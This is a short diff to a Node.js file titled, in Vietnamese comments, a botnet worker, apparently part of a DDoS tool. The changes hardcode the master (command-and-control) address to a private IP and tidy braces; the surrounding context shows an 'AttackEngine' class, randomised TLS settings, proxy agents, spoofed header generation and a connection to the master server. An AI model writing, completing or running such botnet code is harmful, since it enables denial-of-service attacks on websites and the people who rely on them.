@@ -1,3 +1,6 @@
+// worker.js - Botnet Worker dựa trên v1.74
+// node worker.js <master_domain>
+
 process.on('uncaughtException', (err) => {});
 process.on('unhandledRejection', (err) => {});
 process.setMaxListeners(0);
@@ -16,7 +19,7 @@ const axios = require('axios');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
 // ==================== CONFIG ====================
-const MASTER_DOMAIN = process.argv[2];
+const MASTER_DOMAIN = "192.168.1.2:3000";
 const HEALTH_PORT = process.env.PORT || 10000;
 const MAX_SESSIONS_PER_WORKER = 100;
 const SESSION_REFRESH_INTERVAL = 45000;
@@ -480,7 +483,7 @@ function generateHeaders(host, path) {
     Object.keys(headers).forEach(key => headers[key] === undefined && delete headers[key]);
     
     return headers;
-                }
+}
 
 // ==================== TLS CONFIG ====================
 function getRandomTlsConfig() {
@@ -847,7 +850,7 @@ class AttackEngine {
         }
         this.sessionPools.forEach(pool => pool.stop());
     }
-    }
+}
 
 // ==================== KẾT NỐI MASTER ====================
 const masterUrl = `https://${MASTER_DOMAIN}`;
